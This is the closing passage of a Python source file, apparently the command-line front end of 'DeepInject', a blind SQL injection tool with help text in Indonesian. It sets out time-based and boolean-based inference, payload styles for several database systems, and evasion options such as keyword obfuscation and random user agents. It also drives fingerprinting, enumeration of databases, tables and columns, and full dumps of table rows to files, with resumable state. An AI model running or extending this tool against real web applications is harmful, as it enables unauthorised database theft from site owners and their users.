  # Non-interaktif untuk CI / cron
  python deepinject.py -u https://target.local/page.php \\
    --type get --param id -y --enum-db -o db.json --fmt json

─────────────────────────────────────────────────────────
 TEKNIK INFERENSI (--technique)
─────────────────────────────────────────────────────────
  auto  Uji time-based dulu; jika tidak ada delay, pindah ke
        boolean-based response-diffing (default)
  time  Paksa time-based (SLEEP/WAITFOR/pg_sleep/...)
  bool  Paksa boolean-based (bandingkan fingerprint respons)

─────────────────────────────────────────────────────────
 PAYLOAD STYLES (--payload-style N)
─────────────────────────────────────────────────────────
  0  IF-SLEEP      IF(cond,SLEEP(n),0) / WAITFOR / PG_SLEEP
  1  SUBQUERY      nested subquery per DBMS
  2  XOR           1 XOR(IF(cond,SLEEP,0)) XOR 1
  3  CASE          CASE WHEN cond THEN SLEEP ELSE 0 END
  4  ELT/BLOB      MySQL ELT(), SQLite RANDOMBLOB()
  5  AND-SLEEP     1 AND SLEEP(IF(cond,n,0))
  6  DOUBLE-XOR    double-query XOR comment (default, MySQL)
  7  HEAVY         BENCHMARK / recursive CTE / stacked WAITFOR

  Catatan: setiap style punya implementasi native per DBMS.
  Style yang tidak tersedia untuk --dbms otomatis memakai style 0.

─────────────────────────────────────────────────────────
 OBFUSCATION LEVELS (--obfuscate N)
─────────────────────────────────────────────────────────
  0  None (clean payload)
  1  Space → /**/ or %09
  2  + keyword case mixing (SeLeCt, SlEeP)
  3  + inline comment splitting (SL/**/EEP)

─────────────────────────────────────────────────────────
 STATE / RESUME (--state FILE)
─────────────────────────────────────────────────────────
  Setiap kondisi, panjang, karakter dan baris yang sudah
  didapat disimpan ke FILE. Jalankan ulang dengan --resume
  (atau perintah yang sama) untuk melanjutkan tanpa
  mengulangi request yang sudah dibayar. --fresh menghapus.
─────────────────────────────────────────────────────────
"""
    )

    # Target
    t = p.add_argument_group("Target")
    t.add_argument("-u", "--url",   required=True, help="URL target")
    t.add_argument("--type",        default="multipart",
                   choices=["multipart", "form", "json", "get", "cookie", "header"],
                   help="Tipe injection (default: multipart)")
    t.add_argument("--param",       required=True, help="Nama parameter yang di-inject")
    t.add_argument("--fields",      default="", help="Field tambahan: key1=val1,key2=val2")
    t.add_argument("--file-fields", default="", dest="file_fields",
                   help="Field file-upload di multipart (pisah koma): file1,file2")
    t.add_argument("--json-body",   default="", dest="json_body",
                   help="JSON body string untuk --type json")

    # Inference
    inf = p.add_argument_group("Inference")
    inf.add_argument("--technique", default="auto", choices=["auto", "time", "bool"],
                     help="Teknik inferensi: auto (uji keduanya), time, bool (default: auto)")
    inf.add_argument("--bool-template", default="", dest="bool_template",
                     help="Override pasangan payload boolean: 'TRUE_tpl|FALSE_tpl' (butuh {c})")

    # Auth
    a = p.add_argument_group("Auth & Headers")
    a.add_argument("--cookie", default="", help="Cookie: key1=val1;key2=val2")
    a.add_argument("-H", "--header", action="append", default=[], metavar="HEADER",
                   help="Header tambahan (bisa diulang): -H 'Referer: https://...'")

    # DBMS
    d = p.add_argument_group("DBMS")
    d.add_argument("--dbms", default="mysql",
                   choices=["mysql", "mssql", "pgsql", "oracle", "sqlite"],
                   help="Target DBMS (default: mysql)")

    # Timing
    ti = p.add_argument_group("Timing")
    ti.add_argument("--sleep",     type=int,   default=5,   help="Sleep seconds (default: 5)")
    ti.add_argument("--threshold", type=float, default=3.5, help="Threshold deteksi (default: 3.5)")
    ti.add_argument("--retries",   type=int,   default=3,   help="Retry per request (default: 3)")
    ti.add_argument("--timeout",   type=int,   default=20,  help="Request timeout (default: 20)")
    ti.add_argument("--delay",     type=float, default=0.0, dest="request_delay",
                    help="Jeda antar request dalam detik (rate limit, default: 0)")
    ti.add_argument("--sleep-jitter", type=float, default=0.0, dest="sleep_jitter",
                    help="Tambahan acak 0..N detik ke --delay (default: 0)")

    # Extraction
    ex = p.add_argument_group("Extraction")
    ex.add_argument("--max-len",  type=int, default=128, dest="max_len",
                    help="Panjang string maks (default: 128)")
    ex.add_argument("--threads",  type=int, default=1,
                    help="Thread parallel char extraction (default: 1)")

    # Evasion
    ev = p.add_argument_group("Evasion")
    ev.add_argument("--obfuscate",     type=int, default=0, choices=[0,1,2,3],
                    help="Level obfuscation 0-3 (default: 0)")
    ev.add_argument("--payload-style", type=int, default=6, dest="payload_style",
                    help="Payload wrapper 0-7 (default: 6)")
    ev.add_argument("--proxy",         default=None, help="Proxy: http://127.0.0.1:8080")
    ev.add_argument("--rand-agent",    action="store_true", dest="rand_agent",
                    help="Rotasi User-Agent acak tiap request")
    ev.add_argument("--verbose", "-v", action="store_true",
                    help="Tampilkan payload dan elapsed time tiap request")

    # Actions
    ac = p.add_argument_group("Actions")
    ac.add_argument("--auto-detect",  action="store_true", dest="auto_detect",
                    help="Auto-detect payload style yang berhasil")
    ac.add_argument("--calibrate",    action="store_true",
                    help="Kalibrasi baseline response time")
    ac.add_argument("--verify",       action="store_true",
                    help="Hanya verifikasi kerentanan lalu keluar")
    ac.add_argument("--fingerprint",  action="store_true",
                    help="Ambil info server (version, user, host, dir)")
    ac.add_argument("--enum-db",      action="store_true", dest="enum_db",
                    help="Enumerasi semua database")
    ac.add_argument("--enum-tables",  action="store_true", dest="enum_tables",
                    help="Enumerasi tabel dalam --db")
    ac.add_argument("--enum-columns", action="store_true", dest="enum_columns",
                    help="Enumerasi kolom dalam --db --table")
    ac.add_argument("--dump",         action="store_true",
                    help="Dump data tabel")
    ac.add_argument("--dump-all",     action="store_true", dest="dump_all",
                    help="Pipeline lengkap: databases → tables → columns → rows")
    ac.add_argument("--exclude-db",   default="", dest="exclude_db",
                    help="Database yang dilewati --dump-all (pisah koma; kosongkan dengan '-')")
    ac.add_argument("--stats",        action="store_true",
                    help="Tampilkan ringkasan statistik request di akhir run")
    ac.add_argument("--query",        default="", help="Ekstrak hasil custom SQL query")
    ac.add_argument("--db",           default="", help="Nama database target")
    ac.add_argument("--table",        default="", help="Nama tabel target")
    ac.add_argument("--columns",      default="", help="Kolom untuk dump (pisah koma)")
    ac.add_argument("--dump-limit",   type=int, default=50, dest="dump_limit",
                    help="Maks baris yang di-dump (default: 50)")

    # State
    st = p.add_argument_group("State & Automation")
    st.add_argument("--state",  default=None,
                    help="File state JSON untuk checkpoint/resume (mis. state.json)")
    st.add_argument("--resume", action="store_true",
                    help="Lanjutkan dari --state (tidak menghapus progress)")
    st.add_argument("--fresh",  action="store_true",
                    help="Hapus --state sebelum mulai")
    st.add_argument("--state-clear", action="store_true", dest="state_clear",
                    help="Kosongkan --state lalu keluar")
    st.add_argument("-y", "--yes", action="store_true", dest="assume_yes",
                    help="Jawab 'ya' otomatis (non-interaktif / CI)")

    # Output
    o = p.add_argument_group("Output")
    o.add_argument("-o", "--output", default=None, help="File output")
    o.add_argument("--fmt",          default="txt", choices=["txt", "json", "csv", "jsonl"],
                   help="Format output (default: txt)")
    o.add_argument("--dump-dir", default=None, dest="dump_dir",
                   help="Direktori untuk file per-tabel saat --dump-all")

    return p


# ─────────────────────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────────────────────

def main(argv: Optional[List[str]] = None):
    parser = build_parser()
    args = parser.parse_args(argv)
    print(BANNER)

    # ── State file handling (--state-clear / --fresh) ───────
    if args.state_clear:
        if not args.state:
            print("[!] --state-clear membutuhkan --state FILE")
            sys.exit(2)
        store = CheckpointStore(args.state, fresh=True)
        print(f"[+] State dikosongkan → {store.path}")
        sys.exit(0)

    if args.resume and not args.state:
        print("[!] --resume membutuhkan --state FILE")
        sys.exit(2)

    # Build multipart_fields
    fields: Dict[str, Any] = parse_kv(args.fields)
    if args.json_body:
        try:
            fields = json.loads(args.json_body)
        except json.JSONDecodeError as e:
            print(f"[!] --json-body bukan JSON valid: {e}")
            sys.exit(2)

    if args.type == "json" and not args.json_body:
        print("[!] --type json membutuhkan --json-body '{\"...\":\"...\"}'")
        sys.exit(2)

    for name, value in (("--sleep", args.sleep), ("--threshold", args.threshold),
                        ("--retries", args.retries), ("--timeout", args.timeout),
                        ("--max-len", args.max_len), ("--threads", args.threads),
                        ("--dump-limit", args.dump_limit)):
        if value <= 0:
            print(f"[!] {name} harus > 0 (diberikan: {value})")
            sys.exit(2)

    file_fields = [f.strip() for f in args.file_fields.split(",") if f.strip()]

    try:
        bool_template = _BoolTemplates.parse_override(args.bool_template) \
            or _BoolTemplates.for_dbms(args.dbms)
    except ValueError as e:
        print(f"[!] {e}")
        sys.exit(2)

    if not PayloadFactory.supports(args.dbms, args.payload_style):
        supported = ", ".join(str(s) for s in PayloadFactory.styles_for(args.dbms))
        print(f"[i] Style {args.payload_style} tidak punya implementasi untuk "
              f"{args.dbms}; memakai style 0. Style tersedia: {supported}")

    store = CheckpointStore(args.state, fresh=args.fresh)
    install_signal_handler(store if store.enabled else None)

    if args.exclude_db == "-":
        exclude_dbs: List[str] = []
    elif args.exclude_db:
        exclude_dbs = [s.strip() for s in args.exclude_db.split(",") if s.strip()]
    else:
        exclude_dbs = Config.__dataclass_fields__["exclude_dbs"].default_factory()

    cfg = Config(
        url=args.url,
        inject_param=args.param,
        inject_type=args.type,
        multipart_fields=fields,
        file_fields=file_fields,
        cookies=parse_cookies(args.cookie),
        headers=default_headers(args.header),
        sleep_sec=args.sleep,
        threshold=args.threshold,
        retries=args.retries,
        timeout=args.timeout,
        max_len=args.max_len,
        threads=args.threads,
        dbms=args.dbms,
        obfuscation_level=args.obfuscate,
        payload_style=args.payload_style,
        technique=args.technique,
        output_file=args.output,
        output_fmt=args.fmt,
        proxy=args.proxy,
        verbose=args.verbose,
        request_delay=args.request_delay,
        sleep_jitter=args.sleep_jitter,
        rand_agent=args.rand_agent,
        bool_template=bool_template,
        state_file=args.state,
        fresh=args.fresh,
        assume_yes=args.assume_yes,
        dump_all=args.dump_all,
        dump_limit=args.dump_limit,
        exclude_dbs=exclude_dbs,
    )

    # Print config summary
    print(f"  Target     : {cfg.url}")
    print(f"  Param      : {cfg.inject_param}  [{cfg.inject_type}]")
    if cfg.cookies:
        print(f"  Cookies    : {', '.join(cfg.cookies.keys())}")
    if cfg.file_fields:
        print(f"  File fields: {', '.join(cfg.file_fields)}")
    print(f"  DBMS       : {cfg.dbms.upper()}")
    print(f"  Technique  : {cfg.technique}")
    print(f"  Payload    : style={cfg.payload_style}  obfuscate={cfg.obfuscation_level}")
    print(f"  Timing     : sleep={cfg.sleep_sec}s  threshold={cfg.threshold}s  retries={cfg.retries}")
    if cfg.request_delay or cfg.sleep_jitter:
        print(f"  Rate limit : delay={cfg.request_delay}s  jitter={cfg.sleep_jitter}s")
    if cfg.threads > 1:
        print(f"  Threads    : {cfg.threads}")
    if cfg.proxy:
        print(f"  Proxy      : {cfg.proxy}")
    if store.enabled:
        print(f"  State      : {store.path}  ({store.stats()})")
    print("═" * 60)

    engine = InjectionEngine(cfg)
    engine.state = store if store.enabled else None
    extractor = DataExtractor(engine)
    enumerator = Enumerator(extractor)
    reporter = Reporter(args.output, args.fmt)

    # ── Calibrate
    if args.calibrate:
        engine.calibrate()

    # ── Technique + payload discovery ───────────────────────
    if args.technique == TECH_AUTO:
        print("\n[*] Memilih teknik inferensi (auto)...")
        det = TechniqueDetector(engine)
        time_ok, style = det.probe_time_based()
        if time_ok:
            cfg.technique = TECH_TIME
            cfg.payload_style = style
            print(f"  [+] Time-based OK (style={style})")
        else:
            bool_ok, score = det.probe_boolean_based()
            if bool_ok:
                cfg.technique = TECH_BOOL
                print(f"  [+] Time-based gagal → memakai boolean-based (diff={score})")
            else:
                print("  [-] Time-based dan boolean-based sama-sama tidak memberi sinyal.")
                if not args.assume_yes and not ask_yes_no("  Lanjutkan tetap?", default=False):
                    sys.exit(1)
    elif args.technique == TECH_BOOL:
        print("\n[*] Boolean calibration...")
        ok, score = engine.calibrate_boolean()
        if not ok:
            print("  [-] Boolean-based tidak bisa dipakai (respons TRUE/FALSE identik).")
            print("      Fallback ke time-based.")
            cfg.technique = TECH_TIME
            if not engine.verify():
                print("  [-] Time-based juga tidak memberi sinyal.")
                if not args.assume_yes and not ask_yes_no("  Lanjutkan tetap?", default=False):
                    sys.exit(1)
        else:
            print(f"  [+] Boolean-based aktif (diff={score}, tolerance={engine.bool_tolerance})")
    else:
        # ── Auto-detect / verify payload style ──────────────
        if args.auto_detect:
            print("\n[*] Auto-detecting payload style...\n")
            if not engine.auto_detect():
                print("\n[!] Semua probe gagal. Coba naikkan --sleep atau periksa koneksi.")
                sys.exit(1)
            print(f"\n[+] Payload style {cfg.payload_style} berhasil.")
        else:
            print("\n[*] Verifikasi kerentanan...")
            if engine.verify():
                print(f"  [+] VULNERABLE — delay {cfg.sleep_sec}s terdeteksi (style={cfg.payload_style})")
            else:
                print("  [-] Tidak ada delay terdeteksi.")
                print("      Saran: --auto-detect, --technique auto, atau naikkan --sleep")
                has_work = any([args.fingerprint, args.enum_db, args.enum_tables,
                                args.enum_columns, args.dump, args.dump_all, args.query])
                if not has_work:
                    sys.exit(1)
                if not ask_yes_no("  Lanjutkan tetap?", default=False, assume_yes=cfg.assume_yes):
                    sys.exit(0)

    if args.verify:
        print(f"\n[+] Selesai — teknik aktif: {cfg.technique}\n")
        sys.exit(0)

    # ── Fingerprint
    if args.fingerprint:
        info = enumerator.fingerprint()
        reporter.add("fingerprint", info)
        print("\n  ┌─ FINGERPRINT " + "─" * 44)
        for k, v in info.items():
            print(f"  │ {k:15} : {v}")
        print("  └" + "─" * 58)

    # ── Custom query
    if args.query:
        print(f"\n[*] Custom query: {args.query}")
        print("  Result: ", end="", flush=True)
        result = extractor.extract(args.query)
        print()
        reporter.add("custom_query", {"query": args.query, "result": result})

    # ── Enum databases
    if args.enum_db:
        dbs = enumerator.enum_databases()
        reporter.add("databases", dbs)
        print("\n  ┌─ DATABASES " + "─" * 46)
        for i, db in enumerate(dbs, 1):
            print(f"  │ [{i:02d}] {db}")
        print(f"  └─ Total: {len(dbs)}")

    # ── Enum tables
    if args.enum_tables and not args.dump_all:
        db = args.db
        if not db:
            print("\n[*] Mengambil database aktif untuk enum tables...")
            db = enumerator.get_current_db()
        tables = enumerator.enum_tables(db)
        reporter.add(f"tables_{db}", tables)
        print(f"\n  ┌─ TABLES in '{db}'" + "─" * 40)
        for i, tbl in enumerate(tables, 1):
            print(f"  │ [{i:02d}] {tbl}")
        print(f"  └─ Total: {len(tables)}")

    # ── Enum columns
    if args.enum_columns and not args.dump_all:
        db = args.db
        table = args.table
        if not table:
            print("[!] --enum-columns membutuhkan --table")
            sys.exit(2)
        if not db:
            db = enumerator.get_current_db()
        cols = enumerator.enum_columns(db, table)
        reporter.add(f"columns_{db}_{table}", cols)
        print(f"\n  ┌─ COLUMNS in '{db}.{table}'" + "─" * 32)
        for i, c in enumerate(cols, 1):
            print(f"  │ [{i:02d}] {c}")
        print(f"  └─ Total: {len(cols)}")

    # ── Dump single table
    if args.dump and not args.dump_all:
        db = args.db
        table = args.table
        if not table:
            print("[!] --dump membutuhkan --table")
            sys.exit(2)
        if not db:
            db = enumerator.get_current_db()
        columns = [c.strip() for c in args.columns.split(",") if c.strip()]
        if not columns:
            columns = enumerator.enum_columns(db, table)
        rows = enumerator.dump_table(db, table, columns, limit=args.dump_limit)
        reporter.add(f"dump_{db}_{table}", rows)
        print_table(rows, columns, f"{db}.{table}")

    # ── Dump-all pipeline
    if args.dump_all:
        pipeline = DumpAll(enumerator, extractor, reporter, cfg)
        result = pipeline.run(args.db, skip_dbs=cfg.exclude_dbs)
        print(f"\n  ┌─ DUMP-ALL SUMMARY " + "─" * 41)
        print(f"  │ Databases : {len(result['databases'])}")
        print(f"  │ Tables    : {result['tables_dumped']}")
        print(f"  │ Rows      : {result['rows']}")
        print("  └" + "─" * 58)
        if args.dump_dir:
            write_dump_dir(args.dump_dir, result, cfg)

    # ── Run metadata + stats
    stats_snapshot = engine.stats.snapshot()
    reporter.set_meta({
        "tool": "DeepInject",
        "version": __version__,
        "url": cfg.url,
        "inject_param": cfg.inject_param,
        "inject_type": cfg.inject_type,
        "dbms": cfg.dbms,
        "technique": cfg.technique,
        "payload_style": cfg.payload_style,
        "obfuscation_level": cfg.obfuscation_level,
        "threads": cfg.threads,
        "requests": stats_snapshot["requests"],
        "elapsed_seconds": stats_snapshot["wall_time"],
        "checkpoint_steps": len(store.data.get("steps", {})) if store.enabled else 0,
    })
    reporter.add("stats", stats_snapshot)
    reporter.save()

    print("\n  ┌─ STATISTIK " + "─" * 47)
    for line in engine.stats.summary_lines():
        print(f"  │ {line}")
    if store.enabled:
        print(f"  │ State        : {store.path} ({store.stats()})")
    print("  └" + "─" * 58)
    if args.stats:
        print(json.dumps(stats_snapshot, indent=2))
    print("\n[+] Selesai.\n")
    return 0


def print_table(rows: List[Dict[str, str]], columns: List[str], title: str, col_w: int = 20):
    if not rows:
        return
    header = " | ".join(f"{c[:col_w]:<{col_w}}" for c in columns)
    print(f"\n  ┌─ DUMP {title} " + "─" * 40)
    print("  │ " + header)
    print("  │ " + "─" * len(header))
    for row in rows:
        line = " | ".join(f"{str(row.get(c, ''))[:col_w]:<{col_w}}" for c in columns)
        print("  │ " + line)
    print(f"  └─ {len(rows)} baris")


def write_dump_dir(path: str, result: Dict[str, Any], cfg: Config) -> List[str]:
    """Write one JSON file per dumped table (plus manifest) into --dump-dir."""
    os.makedirs(path, exist_ok=True)
    written: List[str] = []
    manifest: List[Dict[str, Any]] = []
    for dbname, info in result.get("databases", {}).items():
        if not isinstance(info, dict):
            continue
        for table, data in info.items():
            if table == "tables" or not isinstance(data, dict):
                continue
            fname = f"{sanitize_filename(dbname)}.{sanitize_filename(table)}.json"
            target = os.path.join(path, fname)
            payload = {
                "database": dbname,
                "table": table,
                "columns": data.get("columns", []),
                "rows": data.get("rows", []),
            }
            with open(target, "w", encoding="utf-8") as f:
                json.dump(payload, f, indent=2, default=str)
            written.append(target)
            manifest.append({"file": fname, "database": dbname, "table": table,
                             "rows": len(data.get("rows", []))})
    manifest_path = os.path.join(path, "manifest.json")
    with open(manifest_path, "w", encoding="utf-8") as f:
        json.dump({"target": cfg.url, "dbms": cfg.dbms, "tables": manifest},
                  f, indent=2, default=str)
    print(f"\n[+] {len(written)} file tabel + manifest ditulis → {path}")
    return written


def main_entry(argv=None) -> int:
    """Programmatic entry point: never raises SystemExit.

    ``main`` uses ``sys.exit`` for both success paths and usage errors, which is
    right for a CLI but hostile to tests and embedding, so the exit code is
    captured and returned instead.
    """
    try:
        return main(argv) or 0
    except SystemExit as exc:
        code = exc.code
        if code is None:
            return 0
        if isinstance(code, int):
            return code
        print(code, file=sys.stderr)
        return 2


if __name__ == "__main__":
    sys.exit(main_entry())